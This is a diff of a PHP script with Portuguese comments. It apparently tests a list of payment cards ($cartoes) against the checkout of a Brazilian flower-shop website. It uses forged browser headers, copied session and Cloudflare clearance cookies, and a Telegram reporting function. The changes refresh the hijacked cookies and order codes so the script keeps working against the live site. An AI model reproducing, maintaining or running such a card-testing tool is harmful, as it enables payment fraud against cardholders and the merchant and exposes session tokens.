@@ -12,9 +12,9 @@ $headers = [
     "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
     "Accept: */*",
     "Origin: https://www.coroas24horas.com.br",
-    "Referer: https://www.coroas24horas.com.br/pedido-finalizado/299098-4.html",
+    "Referer: https://www.coroas24horas.com.br/pedido-finalizado/299332-4.html",
     "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6",
-    "Cookie: PHPSESSID=i1r772i6q515vpgkp2h6c7dvo4; clix.session=0607970019573695; _fb.2.1754122259630.25478007243199199; _GA1.1.523710924.1754122262; cf_clearance=QfvbI16gUTQat_suPL6E._RvEWUwy.r1iJUuRgxp2PU-1752904560-1.2.1.1-hLJU9vOd4mJmJr_Y0F7wZ5kFLuOi5x5t_6MKrZZIaZFkhiX08JPydcUYrrDaA4qSWcOZ2fc_hp_sDT72hU4EzY2.0gwLfTs73O5Z_PHBOt3l8rmMKMmO0L6Wna50oNb1O0jDjO.sFWRF2KSoNPnrtx5X5blXgtRBARf3pXvGb4wOgeikSEV57qAjzllphtO2q_LvWBw9mxodcIvHbysrcKTUeKFJJckA6geQyzMZDE8"
+    "Cookie: PHPSESSID=tjo09cc92i3a2lulkpugpskld1; clix.session=2783258907564146; _fb.2.1754114896512.897751804860810456; _GA1.1.525385210.1754114898; cf_clearance=QfvbI16gUTQat_suPL6E._RvEWUwy.r1iJUuRgxp2PU-1752904560-1.2.1.1-hLJU9vOd4mJmJr_Y0F7wZ5kFLuOi5x5t_6MKrZZIaZFkhiX08JPydcUYrrDaA4qSWcOZ2fc_hp_sDT72hU4EzY2.0gwLfTs73O5Z_PHBOt3l8rmMKMmO0L6Wna50oNb1O0jDjO.sFWRF2KSoNPnrtx5X5blXgtRBARf3pXvGb4wOgeikSEV57qAjzllphtO2q_LvWBw9mxodcIvHbysrcKTUeKFJJckA6geQyzMZDE8"
 ];
 
 // Função para enviar mensagem para o Telegram
@@ -66,7 +66,7 @@ foreach ($cartoes as $card) {
                    "1\r\n" .
                    "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                    "Content-Disposition: form-data; name=\"code\"\r\n\r\n" .
-                   "299098\r\n" .
+                   "299332\r\n" .
                    "------WebKitFormBoundaryOYLMQ49KUv5xEBBn--";
 
         // Inicializa cURL
